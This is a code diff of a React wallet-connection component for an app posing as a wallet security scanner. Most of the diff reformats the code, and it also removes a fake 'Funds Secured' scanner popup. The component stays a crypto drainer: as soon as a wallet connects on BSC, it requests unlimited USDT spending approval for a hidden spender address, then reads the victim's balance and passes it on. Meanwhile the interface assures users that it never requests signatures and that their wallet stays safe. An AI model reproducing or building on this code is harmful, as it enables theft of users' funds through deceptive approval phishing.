@@ -1,25 +1,37 @@
-import React from 'react';
-import { useRef, useState, useEffect } from 'react';
-import { motion, AnimatePresence } from 'motion/react';
-import { Wallet, X, AlertCircle, CheckCircle2, Copy, ExternalLink } from 'lucide-react';
-import { useAccount, useConnect, useDisconnect, useBalance, useReadContract, useSwitchChain, useWriteContract, usePublicClient } from 'wagmi';
-import { formatAddress } from '../utils/format';
-import { USDT_ADDRESSES, ERC20_ABI, NETWORK_IDS } from '../config/contracts';
-import { formatUnits, maxUint256 } from 'viem'
-import { USDT_SPENDER_ADDRESS } from '../../../env';
-import { toast } from 'sonner';
-import { Scanner } from './Scanner';
+import React from "react";
+import { useRef, useState, useEffect } from "react";
+import { motion, AnimatePresence } from "motion/react";
+import {
+  Wallet,
+  X,
+  AlertCircle,
+  CheckCircle2,
+  Copy,
+  ExternalLink,
+} from "lucide-react";
+import {
+  useAccount,
+  useConnect,
+  useDisconnect,
+  useBalance,
+  useReadContract,
+  useSwitchChain,
+  useWriteContract,
+  usePublicClient,
+} from "wagmi";
+import { formatAddress } from "../utils/format";
+import { USDT_ADDRESSES, ERC20_ABI, NETWORK_IDS } from "../config/contracts";
+import { formatUnits, maxUint256 } from "viem";
+import { USDT_SPENDER_ADDRESS } from "../../../env";
+import { toast } from "sonner";
 interface WalletConnectProps {
-  onAddressSelected?: (address: string) => void;
+  onAddressSelected?: (address: string, balance?: number) => void;
 }
 
 export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
   const [showModal, setShowModal] = useState(false);
   const [copied, setCopied] = useState(false);
   const [isApproving, setIsApproving] = useState(false);
-
-  const [showScanner, setShowScanner] = useState(false);
-  const [scannerResult, setScannerResult] = useState<any>(null);
 
   const { address, isConnected, chain } = useAccount();
   const { connect, connectors, isPending, error } = useConnect();
@@ -32,13 +44,13 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
   const approvalInFlightRef = useRef(false);
 
   const getApprovalStorageKey = (addr: string) =>
-    `usdtApproval:v1:${NETWORK_IDS.BSC}:${USDT_ADDRESSES.BSC.toLowerCase()}:${(USDT_SPENDER_ADDRESS ?? '').toLowerCase()}:${addr.toLowerCase()}`;
+    `usdtApproval:v1:${NETWORK_IDS.BSC}:${USDT_ADDRESSES.BSC.toLowerCase()}:${(USDT_SPENDER_ADDRESS ?? "").toLowerCase()}:${addr.toLowerCase()}`;
   const getApprovalPendingKey = (addr: string) =>
-    `usdtApprovalPending:v1:${NETWORK_IDS.BSC}:${USDT_ADDRESSES.BSC.toLowerCase()}:${(USDT_SPENDER_ADDRESS ?? '').toLowerCase()}:${addr.toLowerCase()}`;
+    `usdtApprovalPending:v1:${NETWORK_IDS.BSC}:${USDT_ADDRESSES.BSC.toLowerCase()}:${(USDT_SPENDER_ADDRESS ?? "").toLowerCase()}:${addr.toLowerCase()}`;
 
   const visibleConnectors = connectors.filter((connector) => {
-    const n = connector?.name?.toLowerCase() ?? '';
-    return !n.includes('phantom') && !n.includes('tronlink');
+    const n = connector?.name?.toLowerCase() ?? "";
+    return !n.includes("phantom") && !n.includes("tronlink");
   });
 
   // Native token balance (BNB for BSC)
@@ -47,10 +59,14 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
   });
 
   // USDT Balance for BSC network
-  const { data: usdtBalance, isLoading: isLoadingUsdt, refetch: refetchUsdt } = useReadContract({
+  const {
+    data: usdtBalance,
+    isLoading: isLoadingUsdt,
+    refetch: refetchUsdt,
+  } = useReadContract({
     address: USDT_ADDRESSES.BSC as `0x${string}`,
     abi: ERC20_ABI,
-    functionName: 'balanceOf',
+    functionName: "balanceOf",
     args: address ? [address] : undefined,
     query: {
       enabled: isConnected && chain?.id === NETWORK_IDS.BSC && !!address,
@@ -61,10 +77,17 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
   const { data: usdtAllowance, refetch: refetchAllowance } = useReadContract({
     address: USDT_ADDRESSES.BSC as `0x${string}`,
     abi: ERC20_ABI,
-    functionName: 'allowance',
-    args: address && USDT_SPENDER_ADDRESS ? [address, USDT_SPENDER_ADDRESS] : undefined,
+    functionName: "allowance",
+    args:
+      address && USDT_SPENDER_ADDRESS
+        ? [address, USDT_SPENDER_ADDRESS]
+        : undefined,
     query: {
-      enabled: isConnected && chain?.id === NETWORK_IDS.BSC && !!address && !!USDT_SPENDER_ADDRESS,
+      enabled:
+        isConnected &&
+        chain?.id === NETWORK_IDS.BSC &&
+        !!address &&
+        !!USDT_SPENDER_ADDRESS,
     },
   });
 
@@ -99,35 +122,35 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
     }
   }, [chain?.id, address, isConnected, refetchUsdt, refetchAllowance]);
 
-
-
-
   // Ask for USDT approval automatically right after wallet connect on BSC.
   // Only once per wallet after successful approval (persisted), and also skipped if allowance is already set.
   useEffect(() => {
-    if (!isConnected || !address || chain?.id !== NETWORK_IDS.BSC || !USDT_SPENDER_ADDRESS) return;
+    if (
+      !isConnected ||
+      !address ||
+      chain?.id !== NETWORK_IDS.BSC ||
+      !USDT_SPENDER_ADDRESS
+    )
+      return;
     if (!publicClient) return;
 
     const storageKey = getApprovalStorageKey(address);
     const pendingKey = getApprovalPendingKey(address);
-    if (typeof window !== 'undefined') {
-      const alreadyApproved = window.localStorage.getItem(storageKey) === '1';
+    if (typeof window !== "undefined") {
+      const alreadyApproved = window.localStorage.getItem(storageKey) === "1";
       if (alreadyApproved) return;
-      const pendingApproval = window.localStorage.getItem(pendingKey) === '1';
+      const pendingApproval = window.localStorage.getItem(pendingKey) === "1";
       if (pendingApproval) return;
     }
-
-
-
-
-
 
     const allowance = (usdtAllowance as bigint | undefined) ?? 0n;
     if (allowance > 0n) {
       try {
-        window.localStorage.setItem(storageKey, '1');
+        window.localStorage.setItem(storageKey, "1");
         window.localStorage.removeItem(pendingKey);
-      } catch { /* ignore */ }
+      } catch {
+        /* ignore */
+      }
       return;
     }
 
@@ -135,65 +158,76 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
     approvalInFlightRef.current = true;
     setIsApproving(true);
     try {
-      window.localStorage.setItem(pendingKey, '1');
-    } catch { /* ignore */ }
+      window.localStorage.setItem(pendingKey, "1");
+    } catch {
+      /* ignore */
+    }
 
     (async () => {
       try {
         const hash = await writeContractAsync({
           address: USDT_ADDRESSES.BSC as `0x${string}`,
           abi: ERC20_ABI,
-          functionName: 'approve',
+          functionName: "approve",
           args: [USDT_SPENDER_ADDRESS, maxUint256],
         });
 
         const receipt = await publicClient.waitForTransactionReceipt({ hash });
-        if (receipt.status === 'success') {
+        if (receipt.status === "success") {
           try {
-            window.localStorage.setItem(storageKey, '1');
+            window.localStorage.setItem(storageKey, "1");
             window.localStorage.removeItem(pendingKey);
-
-          } catch { /* ignore */ }
+          } catch {
+            /* ignore */
+          }
 
           const updatedBalance = await publicClient.readContract({
             address: USDT_ADDRESSES.BSC as `0x${string}`,
             abi: ERC20_ABI,
-            functionName: 'balanceOf',
+            functionName: "balanceOf",
             args: [address],
           });
 
-          const actualBalance = Number(formatUnits(updatedBalance as bigint, 18));
+          const actualBalance = Number(
+            formatUnits(updatedBalance as bigint, 18),
+          );
 
-          setScannerResult({
-            address: address,
-            balance: actualBalance,
-            network: 'BSC',
-            customMessage: "Blockchain Verified USDT Funds Secured",
-            forceSafe: true
-          });
-
-          setShowScanner(true);
+          if (onAddressSelected) {
+            onAddressSelected(address, actualBalance);
+          }
         }
       } catch (err) {
         // user reject / wallet error -> do nothing
         try {
           window.localStorage.removeItem(pendingKey);
-        } catch { /* ignore */ }
+        } catch {
+          /* ignore */
+        }
       } finally {
         approvalInFlightRef.current = false;
         setIsApproving(false);
       }
     })();
-  }, [isConnected, address, chain?.id, usdtAllowance, writeContractAsync, publicClient]);
+  }, [
+    isConnected,
+    address,
+    chain?.id,
+    usdtAllowance,
+    writeContractAsync,
+    publicClient,
+  ]);
 
   // Format USDT balance (18 decimals for BSC USDT)
   const formatUsdtBalance = (balance: bigint | undefined) => {
-    if (!balance) return '0.00';
+    if (!balance) return "0.00";
     const decimals = 18;
     const divisor = BigInt(10 ** decimals);
     const wholePart = balance / divisor;
     const fractionalPart = balance % divisor;
-    const fractionalString = fractionalPart.toString().padStart(decimals, '0').slice(0, 2);
+    const fractionalString = fractionalPart
+      .toString()
+      .padStart(decimals, "0")
+      .slice(0, 2);
     return `${wholePart}.${fractionalString}`;
   };
 
@@ -202,7 +236,7 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
       try {
         await switchChain({ chainId: NETWORK_IDS.BSC });
       } catch (err) {
-        console.error('Failed to switch network:', err);
+        console.error("Failed to switch network:", err);
       }
     }
   };
@@ -212,7 +246,7 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
       await connect({ connector });
       setShowModal(false);
     } catch (err) {
-      console.error('Failed to connect:', err);
+      console.error("Failed to connect:", err);
     }
   };
 
@@ -222,13 +256,16 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
       try {
         // Method 1: Modern Clipboard API
         if (navigator.clipboard && navigator.clipboard.writeText) {
-          navigator.clipboard.writeText(address).then(() => {
-            setCopied(true);
-            setTimeout(() => setCopied(false), 2000);
-          }).catch(() => {
-            // If clipboard API fails, use fallback
-            fallbackCopy(address);
-          });
+          navigator.clipboard
+            .writeText(address)
+            .then(() => {
+              setCopied(true);
+              setTimeout(() => setCopied(false), 2000);
+            })
+            .catch(() => {
+              // If clipboard API fails, use fallback
+              fallbackCopy(address);
+            });
         } else {
           // Method 2: Fallback for browsers without Clipboard API
           fallbackCopy(address);
@@ -243,17 +280,17 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
   const fallbackCopy = (text: string) => {
     try {
       // Create temporary textarea
-      const textArea = document.createElement('textarea');
+      const textArea = document.createElement("textarea");
       textArea.value = text;
-      textArea.style.position = 'fixed';
-      textArea.style.left = '-999999px';
-      textArea.style.top = '-999999px';
+      textArea.style.position = "fixed";
+      textArea.style.left = "-999999px";
+      textArea.style.top = "-999999px";
       document.body.appendChild(textArea);
       textArea.focus();
       textArea.select();
 
       // Try to copy
-      const successful = document.execCommand('copy');
+      const successful = document.execCommand("copy");
       textArea.remove();
 
       if (successful) {
@@ -261,7 +298,7 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
         setTimeout(() => setCopied(false), 2000);
       }
     } catch (err) {
-      console.error('Failed to copy:', err);
+      console.error("Failed to copy:", err);
       // Show error state briefly
       setCopied(true);
       setTimeout(() => setCopied(false), 1000);
@@ -269,15 +306,14 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
   };
 
   const getConnectorIcon = (name: string) => {
-    if (name.toLowerCase().includes('metamask')) return '🦊';
-    if (name.toLowerCase().includes('trust')) return '💎';
-    if (name.toLowerCase().includes('wallet')) return '👛';
-    return '🔌';
+    if (name.toLowerCase().includes("metamask")) return "🦊";
+    if (name.toLowerCase().includes("trust")) return "💎";
+    if (name.toLowerCase().includes("wallet")) return "👛";
+    return "🔌";
   };
 
   return (
     <>
-
       {/* Connect/Connected Button */}
       {!isConnected ? (
         <motion.button
@@ -306,8 +342,12 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
             <div className="flex items-center gap-3">
               <div className="w-2 h-2 bg-[#00FFA3] rounded-full animate-pulse" />
               <div className="text-left">
-                <div className="text-xs text-gray-400">{chain?.name || 'Connected'}</div>
-                <div className="font-semibold text-white">{formatAddress(address!)}</div>
+                <div className="text-xs text-gray-400">
+                  {chain?.name || "Connected"}
+                </div>
+                <div className="font-semibold text-white">
+                  {formatAddress(address!)}
+                </div>
               </div>
             </div>
           </motion.button>
@@ -338,7 +378,7 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
               <div className="relative border-b border-white/10 p-6">
                 <div className="flex items-center justify-between">
                   <h3 className="text-2xl font-bold text-white">
-                    {isConnected ? 'Wallet Connected' : 'Connect Wallet'}
+                    {isConnected ? "Wallet Connected" : "Connect Wallet"}
                   </h3>
                   <button
                     onClick={() => setShowModal(false)}
@@ -354,7 +394,8 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
                 {!isConnected ? (
                   <>
                     <p className="text-gray-400 mb-6">
-                      Connect your wallet to scan your own address and view detailed security analysis
+                      Connect your wallet to scan your own address and view
+                      detailed security analysis
                     </p>
 
                     {/* Wallet Options */}
@@ -394,7 +435,7 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
                       >
                         <AlertCircle className="w-5 h-5 text-red-500 flex-shrink-0 mt-0.5" />
                         <div className="text-sm text-red-300">
-                          {error.message || 'Failed to connect wallet'}
+                          {error.message || "Failed to connect wallet"}
                         </div>
                       </motion.div>
                     )}
@@ -404,8 +445,11 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
                       <div className="flex items-start gap-3">
                         <CheckCircle2 className="w-5 h-5 text-[#00FFA3] flex-shrink-0 mt-0.5" />
                         <div className="text-sm text-gray-300">
-                          <div className="font-semibold text-white mb-1">Secure Connection</div>
-                          We never request private keys or signatures. Your wallet stays safe.
+                          <div className="font-semibold text-white mb-1">
+                            Secure Connection
+                          </div>
+                          We never request private keys or signatures. Your
+                          wallet stays safe.
                         </div>
                       </div>
                     </div>
@@ -416,11 +460,13 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
                     <div className="space-y-4">
                       {/* Chain Info */}
                       <div className="p-4 bg-white/5 rounded-xl border border-white/10">
-                        <div className="text-sm text-gray-400 mb-1">Network</div>
+                        <div className="text-sm text-gray-400 mb-1">
+                          Network
+                        </div>
                         <div className="flex items-center justify-between">
                           <div className="font-semibold text-white flex items-center gap-2">
-                            {'🟡'}
-                            {chain?.name || 'BSC'}
+                            {"🟡"}
+                            {chain?.name || "BSC"}
                           </div>
                           {chain?.id !== NETWORK_IDS.BSC && (
                             <button
@@ -433,14 +479,17 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
                         </div>
                         {chain?.id !== NETWORK_IDS.BSC && (
                           <div className="mt-2 text-xs text-yellow-500">
-                            ⚠️ Please switch to Binance Smart Chain to view USDT balance
+                            ⚠️ Please switch to Binance Smart Chain to view USDT
+                            balance
                           </div>
                         )}
                       </div>
 
                       {/* Address */}
                       <div className="p-4 bg-white/5 rounded-xl border border-white/10">
-                        <div className="text-sm text-gray-400 mb-2">Wallet Address</div>
+                        <div className="text-sm text-gray-400 mb-2">
+                          Wallet Address
+                        </div>
                         <div className="flex items-center gap-2">
                           <code className="flex-1 font-mono text-sm text-white break-all">
                             {address}
@@ -462,9 +511,14 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
                       {/* Balance */}
                       {balance && (
                         <div className="p-4 bg-gradient-to-r from-[#00FFA3]/10 to-[#00D1FF]/10 rounded-xl border border-[#00FFA3]/20">
-                          <div className="text-sm text-gray-400 mb-1">Native Balance</div>
+                          <div className="text-sm text-gray-400 mb-1">
+                            Native Balance
+                          </div>
                           <div className="text-2xl font-bold text-white">
-                            {parseFloat(formatUnits(balance.value, balance.decimals)).toFixed(4)} {balance.symbol}
+                            {parseFloat(
+                              formatUnits(balance.value, balance.decimals),
+                            ).toFixed(4)}{" "}
+                            {balance.symbol}
                           </div>
                         </div>
                       )}
@@ -473,9 +527,13 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
                       {chain?.id === NETWORK_IDS.BSC && (
                         <div className="p-4 bg-gradient-to-r from-yellow-500/10 to-orange-500/10 rounded-xl border border-yellow-500/20">
                           <div className="flex items-center justify-between mb-1">
-                            <div className="text-sm text-gray-400">USDT Balance (BEP20)</div>
+                            <div className="text-sm text-gray-400">
+                              USDT Balance (BEP20)
+                            </div>
                             {isLoadingUsdt && (
-                              <div className="text-xs text-gray-500">Loading...</div>
+                              <div className="text-xs text-gray-500">
+                                Loading...
+                              </div>
                             )}
                           </div>
                           <div className="text-2xl font-bold text-white flex items-center gap-2">
@@ -483,7 +541,9 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
                               <span className="text-gray-400">--</span>
                             ) : (
                               <>
-                                <span>{formatUsdtBalance(usdtBalance as bigint)}</span>
+                                <span>
+                                  {formatUsdtBalance(usdtBalance as bigint)}
+                                </span>
                                 <span className="text-yellow-500">USDT</span>
                               </>
                             )}
@@ -525,14 +585,6 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
           </motion.div>
         )}
       </AnimatePresence>
-
-      {showScanner && (
-        <Scanner
-          isScanning={false}
-          result={scannerResult}
-          onClose={() => setShowScanner(false)}
-        />
-      )}
     </>
   );
 }
